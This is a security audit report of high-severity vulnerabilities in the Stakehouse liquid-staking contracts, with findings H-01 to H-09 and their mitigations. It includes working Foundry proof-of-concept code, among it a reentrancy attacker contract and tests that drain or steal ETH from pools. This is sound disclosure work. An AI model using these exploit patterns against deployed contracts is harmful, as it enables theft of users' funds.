[H-01] Any user being the first to claim rewards fromGiantMevAndFeesPoolcan unexepectedly collect them all
Submitted byclems4ever
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203
Any user being the first to claim rewards from GiantMevAndFeesPool, can get all the previously generated rewards whatever the amount and even if he did not participate to generate those rewards…
Proof of Concept
https://gist.github.com/clems4ever/c9fe06ce454ff6c4124f4bd29d3598de
Copy paste it in the test suite and run it.
Tools Used
forge test
Recommended Mitigation Steps
Rework the wayaccumulatedETHPerLPShareandclaimedis used. There are multiple bugs due to the interaction between those variables as you will see in my other reports.
vince0656 (Stakehouse) confirmed

[H-02] Rewards ofGiantMevAndFeesPoolcan be locked for all users
Submitted byclems4ever
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L172https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L8
Any malicious user could make the rewards in GiantMevAndFeesPool inaccessible to all other users…
Proof of Concept
https://gist.github.com/clems4ever/9b05391cc2192c1b6e8178faa38dfe41
Copy the file in the test suite and run the test.
Tools Used
forge test
Recommended Mitigation Steps
Protect the inherited functions of the ERC20 tokens (GiantLP and LPToken) becausetransferis not protected and can trigger thebeforeandafterhooks. There is the same issue with LPToken and StakingFundsVault.
vince0656 (Stakehouse) confirmed

[H-03] Theft of ETH of free floating SLOT holders
Submitted byclems4ever, also found byHE1M
https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L369https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L668https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228
A malicious user can steal all claimable ETH belonging to free floating SLOT holders…
Proof of Concept
https://gist.github.com/clems4ever/f1149743897b2620eab0734f88208603
Run it in the test suite with forge
Tools Used
Manual review / forge
Recommended Mitigation Steps
+=operator instead of=inhttps://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228?
The logic for keeping the rewards up-to-date is also quite complex in my opinion. The main thing that triggered it for me was the lazy call toupdateAccruedETHPerShares. Why not keep the state updated after each operation instead?
vince0656 (Stakehouse) confirmed

[H-04] Unstaking does not update the mappingsETHUserClaimForKnot
Submitted byHE1M, also found by9svR6w
If a user stakes some sETH, and after some time decides to unstake some amount of sETH, later s/he will not be qualified or be less qualified to claim ETH on the remaining staked sETH.
Proof of Concept
Suppose Alice stakes 5 sETH by callingstake(...).https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L203So, we will have:
sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISIONsETHStakedBalanceForKnot[BLS][Alice] = 5 * 10^18sETHTotalStakeForKnot[BLS] += 5 * 10^18
Later, Alice decides to unstake 3 sETH by callingunstake(...).https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245
So, all ETH owed to Alice will be paid:https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L257
Then, we will have:
sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISIONsETHStakedBalanceForKnot[BLS][Alice] = 2 * 10^18sETHTotalStakeForKnot[BLS] -= 3 * 10^18
It is clear that the mappingsETHStakedBalanceForKnotis decreased as expected, but the mappingsETHUserClaimForKnotis not changed. In other words, the mappingsETHUserClaimForKnotis still holding the claimed amount based on the time 5 sETH were staked.
If, after some time, the ETH is accumulated per free floating share for the BLS public key that Alice was staking for, Alice will be qualified to some more ETH to claim (because she has still 2 sETH staked).
If Alice unstakes by callingunstake(...)or claim ETH by callingclaimAsStaker(...), in both calls, the functioncalculateUnclaimedFreeFloatingETHSharewill be called to calculate the amount of unclaimed ETH:https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L652
In this function, we will have:
stakedBal = sETHStakedBalanceForKnot[BLS][Alice]= 2 * 10^18userShare = (newAccumulatedETHPerShare * stakedBal) / PRECISION
The return value which is unclaimed ETH will be:
userShare - sETHUserClaimForKnot[BLS][Alice] =(newAccumulatedETHPerShare * 2 * 10^18) / PRECISION - (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION
This return value is not correct (it is highly possible to be smaller than 0, and as a result Alice can not claim anything), because the claimed ETH is still based on the time when 5 sETH were staked, not on the time when 2 sETH were remaining/staked.
The vulnerability is that during unstaking, the mappingsETHUserClaimForKnotis not updated to the correct value. In other words, this mapping is updated in_claimAsStaker, but it is updated based on 5 sETH staked, later when 3 sETH are unstaked, this mapping should be again updated based on the remaing sETH (which is 2 sETH).
As a result, Alice can not claim ETH or she will qualify for less amount.
Recommended Mitigation Steps
The following line should be added on line 274:
sETHUserClaimForKnot[_blsPubKey][msg.sender] =(accumulatedETHPerShare * sETHStakedBalanceForKnot[_blsPubKey][msg.sender]) / PRECISION
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L274
vince0656 (Stakehouse) confirmed

[H-05] Reentrancy inLiquidStakingManager.sol#withdrawETHForKnowleads to loss of fund from smart wallet
Submitted byladboy233, also found byTrust,btk,0xbepresent,bitbopper, andyixxas
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347
The code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.
/// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked./// @dev A banned node runner cannot withdraw ETH for the KNOT./// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawnfunctionwithdrawETHForKnot(address_recipient,bytescalldata_blsPublicKeyOfKnot)external{require(_recipient!=address(0),"Zero address");require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) ==false,"BLS public key has already withdrawn or not a part of LSD network");addressassociatedSmartWallet=smartWalletOfKnot[_blsPublicKeyOfKnot];require(smartWalletOfNodeRunner[msg.sender] ==associatedSmartWallet,"Not the node runner for the smart wallet ");require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) ==false,"Node runner is banned from LSD network");require(associatedSmartWallet.balance>=4ether,"Insufficient balance");require(getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) ==IDataStructures.LifecycleStatus.INITIALS_REGISTERED,"Initials not registered");// refund 4 ether from smart wallet to node runner's EOAIOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient,"",4ether);// update the mappingbannedBLSPublicKeys[_blsPublicKeyOfKnot] =associatedSmartWallet;emitETHWithdrawnFromSmartWallet(associatedSmartWallet,_blsPublicKeyOfKnot,msg.sender);}
Note the section:
// refund 4 ether from smart wallet to node runner's EOAIOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient,"",4ether);// update the mappingbannedBLSPublicKeys[_blsPublicKeyOfKnot] =associatedSmartWallet;
If the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.
As shown in our running POC.
We need to add the import first:
import{MockAccountManager}from"../../contracts/testing/stakehouse/MockAccountManager.sol";
We can add the smart contract below:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12
interfaceIManager{functionregisterBLSPublicKeys(bytes[]calldata_blsPublicKeys,bytes[]calldata_blsSignatures,address_eoaRepresentative)externalpayable;functionwithdrawETHForKnot(address_recipient,bytescalldata_blsPublicKeyOfKnot)external;}contractNonEOARepresentative{addressmanager;boolstate;constructor(address_manager)payable{bytes[]memorypublicKeys=newbytes[](2);publicKeys[0] ="publicKeys1";publicKeys[1] ="publicKeys2";bytes[]memorysignature=newbytes[](2);signature[0] ="signature1";signature[1] ="signature2";IManager(_manager).registerBLSPublicKeys{value:8ether}(publicKeys,signature,address(this));manager=_manager;}functionwithdraw(bytescalldata_blsPublicKeyOfKnot)external{IManager(manager).withdrawETHForKnot(address(this),_blsPublicKeyOfKnot);}receive()externalpayable{if(!state) {state=true;this.withdraw("publicKeys1");}}}
There is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when callingwithdrawETHForKnot.
We add the test case.
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35
functiontestBypassIsContractCheck_POC()public{NonEOARepresentativepass=newNonEOARepresentative{value:8ether}(address(manager));addresswallet=manager.smartWalletOfNodeRunner(address(pass));addressreprenstative=manager.smartWalletRepresentative(wallet);console.log("smart contract registered as a EOA representative");console.log(address(reprenstative) ==address(pass));// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTEREDMockAccountManager(factory.accountMan()).setLifecycleStatus("publicKeys1",1);// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHERpass.withdraw("publicKeys1");console.log("balance after the withdraw, expected 4 ETH, but has 8 ETH");console.log(address(pass).balance);}
We run the test:
forgetest-vv--matchtestWithdraw_Reentrancy_POC
And the result is
Running1testfortest/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests[PASS]testWithdraw_Reentrancy_POC() (gas:578021)Logs:smart contract registered as a EOA representativetruebalance after the withdraw, expected 4 ETH, but has 8 ETH8000000000000000000Test result: ok. 1 passed; 0 failed; finished in 14.85ms
The function call is
pass.withdraw("publicKeys1"), which calls
functionwithdraw(bytescalldata_blsPublicKeyOfKnot)external{IManager(manager).withdrawETHForKnot(address(this),_blsPublicKeyOfKnot);}
Which trigger:
// refund 4 ether from smart wallet to node runner's EOAIOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient,"",4ether);
Which triggers reentrancy to withdraw the fund again before the public key is banned.
receive()externalpayable{if(!state) {state=true;this.withdraw("publicKeys1");}}
Recommended Mitigation Steps
We recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.
// update the mappingbannedBLSPublicKeys[_blsPublicKeyOfKnot] =associatedSmartWallet;// refund 4 ether from smart wallet to node runner's EOAIOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient,"",4ether);
vince0656 (Stakehouse) confirmed

[H-06]BringUnusedETHBackIntoGiantPoolcan cause stuck ether funds in Giant Pool
Submitted bykoxuan, also found byhihen
https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137-L158
withdrawUnusedETHToGiantPoolwill withdraw any eth from the vault if staking has not commenced(knot status isINITIALS_REGISTERED), the eth will be drawn successful to the giant pool. However, idleETH variable is not updated. idleETH  is the available ETH for withdrawing and depositing eth for staking. Since there is no other places that updates idleETH other than depositing eth for staking and withdrawing eth, the eth withdrawn from the vault will be stuck forever.
Proof of Concept
Place poc in GiantPools.t.sol withimport { MockStakingFundsVault } from "../../contracts/testing/liquid-staking/MockStakingFundsVault.sol";
functiontestStuckFundsInGiantMEV()public{stakingFundsVault=MockStakingFundsVault(payable(manager.stakingFundsVault()));addressnodeRunner=accountOne;vm.deal(nodeRunner,4ether);//address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);//address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);addressvictim=accountFour;vm.deal(victim,1ether);registerSingleBLSPubKey(nodeRunner,blsPubKeyOne,accountFour);emitlog_address(address(giantFeesAndMevPool));vm.startPrank(victim);emitlog_uint(victim.balance);giantFeesAndMevPool.depositETH{value:1ether}(1ether);bytes[][]memoryblsKeysForVaults=newbytes[][](1);blsKeysForVaults[0] =getBytesArrayFromBytes(blsPubKeyOne);uint256[][]memorystakeAmountsForVaults=newuint256[][](1);stakeAmountsForVaults[0] =getUint256ArrayFromValues(1ether);giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1ether) ,blsKeysForVaults,stakeAmountsForVaults);emitlog_uint(victim.balance);vm.warp(block.timestamp+60minutes);LPTokenlp= (stakingFundsVault.lpTokenForKnot(blsKeysForVaults[0][0]));LPToken[][]memorylpToken=newLPToken[][](1);LPToken[]memorytemp=newLPToken[](1);temp[0] =lp;lpToken[0] =temp;emitlog_uint(address(giantFeesAndMevPool).balance);giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(stakingFundsVault)),lpToken,stakeAmountsForVaults);emitlog_uint(address(giantFeesAndMevPool).balance);vm.expectRevert();giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1ether) ,blsKeysForVaults,stakeAmountsForVaults);vm.expectRevert();giantSavETHPool.withdrawETH(1ether);vm.stopPrank();}
Both withdrawing eth for user and depositing eth to stake fails and reverts as shown in the poc due to underflow in idleETH.
Note that the same problem also exists in GiantSavETHVaultPool, however a poc cannot be done for it as another bug exist in GiantSavETHVaultPool which prevents it from receiving funds as it lacks a receive() or fallback() implementation.
Tools Used
Foundry
Recommended Mitigation Steps
UpdateidleETHin withdrawUnusedETHToGiantPool
vince0656 (Stakehouse) confirmed

[H-07] GiantLP with atransferHookProcessorcant be burned, users’ funds will be stuck in the Giant Pool
Submitted byronnyx2017, also found byTrust,rotcivegaf,9svR6w,Lambda, andHE1M
https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantLP.sol#L39-L47https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L73-L78https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L57
The GiantLP with a transferHookProcessor will calltransferHookProcessor.beforeTokenTransfer(_from, _to, _amount)when it’s transferred / minted / burned.
But thetoaddress is address(0x00) in the erc20_burnfunction. The GiantMevAndFeesPool.beforeTokenTransfer will call the functionSyndicateRewardsProcessor._distributeETHRewardsToUserForTokenwill a zero address check in the first line:
function _distributeETHRewardsToUserForToken(...) internal {require(_recipient != address(0), "Zero address");
So any withdraw function with a operation of burning the GiantLP token with a transferHookProcessor will revert because of the zero address check. The users’ funds will be stuck in the Giant Pool contracts.
Proof of Concept
I wrote a test aboutGiantMevAndFeesPool.withdrawETHfunction which is used to withdraw eth from the Giant Pool. It will be reverted.
test/foundry/LpBurn.t.sol
pragma solidity ^0.8.13;// SPDX-License-Identifier: MITimport {GiantPoolTests} from "./GiantPools.t.sol";contract LpBurnTests is GiantPoolTests {function testburn() public{address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);vm.startPrank(feesAndMevUserOne);giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);giantFeesAndMevPool.withdrawETH(4 ether);vm.stopPrank();}}
run test
forge test --match-test testburn -vvv
test log:
......├─ [115584] GiantMevAndFeesPool::withdrawETH(4000000000000000000)│   ├─ [585] GiantLP::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]│   │   └─ ← 4000000000000000000│   ├─ [128081] GiantLP::burn(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 4000000000000000000)│   │   ├─ [126775] GiantMevAndFeesPool::beforeTokenTransfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0x0000000000000000000000000000000000000000, 4000000000000000000)│   │   │   ├─ [371] GiantLP::totalSupply() [staticcall]│   │   │   │   └─ ← 4000000000000000000│   │   │   ├─ emit ETHReceived(amount: 4000000000000000000)│   │   │   ├─ [585] GiantLP::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]│   │   │   │   └─ ← 4000000000000000000│   │   │   ├─ [0] 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266::fallback{value: 4000000000000000000}()│   │   │   │   └─ ← ()│   │   │   ├─ emit ETHDistributed(user: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, recipient: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, amount: 4000000000000000000)│   │   │   ├─ [2585] GiantLP::balanceOf(0x0000000000000000000000000000000000000000) [staticcall]│   │   │   │   └─ ← 0│   │   │   └─ ← "Zero address"│   │   └─ ← "Zero address"│   └─ ← "Zero address"└─ ← "Zero address"
Tools Used
foundry
Recommended Mitigation Steps
Skip update rewards for zero address.
vince0656 (Stakehouse) confirmed duplicate issue #60

[H-08] functionwithdrawETHfromGiantMevAndFeesPoolcan steal most of eth because of idleETH is reduced before burning token
Submitted byronnyx2017, also found bycccz
https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantPoolBase.sol#L57-L60https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76-L90
The contract GiantMevAndFeesPool override the function totalRewardsReceived:
return address(this).balance + totalClaimed - idleETH;
The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the functionSyndicateRewardsProcessor._updateAccumulatedETHPerLP
uint256 received = totalRewardsReceived();uint256 unprocessed = received - totalETHSeen;
But it will decrease theidleETHfirst and then burn the lpTokenETH in the functionGiantMevAndFeesPool.withdrawETH. The lpTokenETH burn option will triggerGiantMevAndFeesPool.beforeTokenTransferwhich will call _updateAccumulatedETHPerLP and send the accumulated rewards to the msg sender. Because of the diminution of the idleETH, theaccumulatedETHPerLPShareis added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.
Proof of Concept
I wrote a test file for proof, but there is another bug/vulnerability which will make theGiantMevAndFeesPool.withdrawETHfunction break down. I submitted it as the other finding named “GiantLP with a transferHookProcessor cant be burned, users’ funds will be stuck in the Giant Pool”. You should fix it first by modifying the codehttps://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L161-L166to :
if (_to != address(0)) {_distributeETHRewardsToUserForToken(_to,address(lpTokenETH),lpTokenETH.balanceOf(_to),_to);}
I know modifying the project source code is controversial. Please believe me it’s a bug needed to be fixed and it’s independent of the current vulnerability.
test:test/foundry/TakeFromGiantPools2.t.sol
pragma solidity ^0.8.13;// SPDX-License-Identifier: MITimport "forge-std/console.sol";import {GiantPoolTests} from "./GiantPools.t.sol";contract TakeFromGiantPools2 is GiantPoolTests {function testDWUpdateRate2() public{address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);address feesAndMevUserTwo = accountTwo; vm.deal(feesAndMevUserTwo, 4 ether);// Deposit ETH into giant fees and mevvm.startPrank(feesAndMevUserOne);giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);vm.stopPrank();vm.startPrank(feesAndMevUserTwo);giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);giantFeesAndMevPool.withdrawETH(4 ether);vm.stopPrank();console.log("user one:", getBalance(feesAndMevUserOne));console.log("user two(attacker):", getBalance(feesAndMevUserTwo));console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));}function getBalance(address addr) internal returns (uint){// just ETHreturn addr.balance;  // + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);}}
run test:
forge test --match-test testDWUpdateRate2 -vvv
test log:
Logs:user one: 0user two(attacker): 6000000000000000000giantFeesAndMevPool: 2000000000000000000
The attacker stole 2 eth from the pool.
Tools Used
foundry
Recommended Mitigation Steps
idleETH -= _amount;should be after thelpTokenETH.burn.
vince0656 (Stakehouse) confirmed

[H-09] Incorrect accounting inSyndicateRewardsProcessorresults in any LP token holder being able to steal other LP tokens holder’s ETH from the fees and MEV vault
Submitted byc7e7eff, also found byTrust,0x4non,arcoun,Jeiwan,unforgiven,cccz,corerouter,rotcivegaf,koxuan,aphak5010,9svR6w,HE1M, andclems4ever
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88
The SyndicateRewardsProcessor’s internal_distributeETHRewardsToUserForToken()function is called from externalclaimRewards()function in theStakingFundsVaultcontract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards.The accumulated rewardsdueare calculated as((accumulatedETHPerLPShare * balance) / PRECISION)reduced by the previous claimed amount stored inclaimed[_user][_token]. When the ETH is sent to the_userthe stored value should be increased by thedueamount. However in the current code base theclaimed[_user][_token]is set equal to the calculateddue.
function_distributeETHRewardsToUserForToken(address_user,address_token,uint256_balance,address_recipient)internal{require(_recipient!=address(0),"Zero address");uint256balance=_balance;if(balance>0) {// Calculate how much ETH rewards the address is owed / dueuint256due= ((accumulatedETHPerLPShare*balance) /PRECISION) -claimed[_user][_token];if(due>0) {claimed[_user][_token] =due;totalClaimed+=due;(boolsuccess, ) =_recipient.call{value:due}("");...}}}
This means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in theclaimed[_user][_token].  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.
Proof of Concept
Following modification to the existingStakingFundsVault.t.solwill provide a test to demonstrate the issue:
diff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.solindex 53b4ce0..4db8fc8 100644--- a/test/foundry/StakingFundsVault.t.sol+++ b/test/foundry/StakingFundsVault.t.sol@@ -4,6 +4,7 @@ import "forge-std/console.sol";import { StakingFundsVault } from "../../contracts/liquid-staking/StakingFundsVault.sol";import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";+import { SyndicateRewardsProcessor} from "../../contracts/liquid-staking/SyndicateRewardsProcessor.sol";import {TestUtils,MockLSDNFactory,@@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {assertEq(vault.totalClaimed(), rewardsAmount);assertEq(vault.totalRewardsReceived(), rewardsAmount);}++    function testRepetitiveClaim() public {+        // register BLS key with the network+        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive);++        vm.label(accountOne, "accountOne");+        vm.label(accountTwo, "accountTwo");+        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool+        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));+        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));++        // Do a deposit of 24 ETH for savETH pool+        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether);++        stakeAndMintDerivativesSingleKey(blsPubKeyFour);++        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour);++        vm.warp(block.timestamp + 3 hours);++        // Deal ETH to the staking funds vault+        uint256 rewardsAmount = 1.2 ether;+        console.log("depositing %s wei into the vault.\n", rewardsAmount);+        vm.deal(address(vault), rewardsAmount);+        assertEq(address(vault).balance, rewardsAmount);+        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);+        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);++        logAccounts();++        console.log("Claiming rewards for accountOne.\n");+        vm.prank(accountOne);+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));+        logAccounts();++        console.log("depositing %s wei into the vault.\n", rewardsAmount);+        vm.deal(address(vault), address(vault).balance + rewardsAmount);+        vm.warp(block.timestamp + 3 hours);+        logAccounts();++        console.log("Claiming rewards for accountOne.\n");+        vm.prank(accountOne);+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));+        logAccounts();++        console.log("Claiming rewards for accountOne AGAIN.\n");+        vm.prank(accountOne);+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));+        logAccounts();++        console.log("Claiming rewards for accountOne AGAIN.\n");+        vm.prank(accountOne);+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));+        logAccounts();++        //console.log("Claiming rewards for accountTwo.\n");+        vm.prank(accountTwo);+        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour));++    }++    function logAccounts() internal {+        console.log("accountOne previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)));+        console.log("accountOne claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour))));+        console.log("accountTwo previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)));+        console.log("accountTwo claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour))));+        console.log("ETH Balances: accountOne: %i, accountTwo: %i, vault: %i\n", accountOne.balance, accountTwo.balance, address(vault).balance);+    }+}
Note that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.
Following is an output of the test script showing the balances and differnet state variables:
forge test -vv --match testRepetitiveClaim[⠑] Compiling...No files changed, compilation skippedRunning 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)Logs:depositing 1200000000000000000 wei into the vault.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 0accountTwo previewAccumulatedETH : 600000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000Claiming rewards for accountOne.accountOne previewAccumulatedETH : 0accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 600000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000depositing 1200000000000000000 wei into the vault.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 1200000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000Claiming rewards for accountOne.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 1200000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000Claiming rewards for accountOne AGAIN.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 1200000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000Claiming rewards for accountOne AGAIN.accountOne previewAccumulatedETH : 600000000000000000accountOne claimed               : 600000000000000000accountTwo previewAccumulatedETH : 1200000000000000000accountTwo claimed               : 0ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0Test result: FAILED. 0 passed; 1 failed; finished in 15.64msFailing tests:Encountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)Encountered a total of 1 failing tests, 0 tests succeeded
Tools Used
Manual review / forge test
Recommended Mitigation Steps
TheSyndicateRewardsProcessorcontract should be modified as follows:
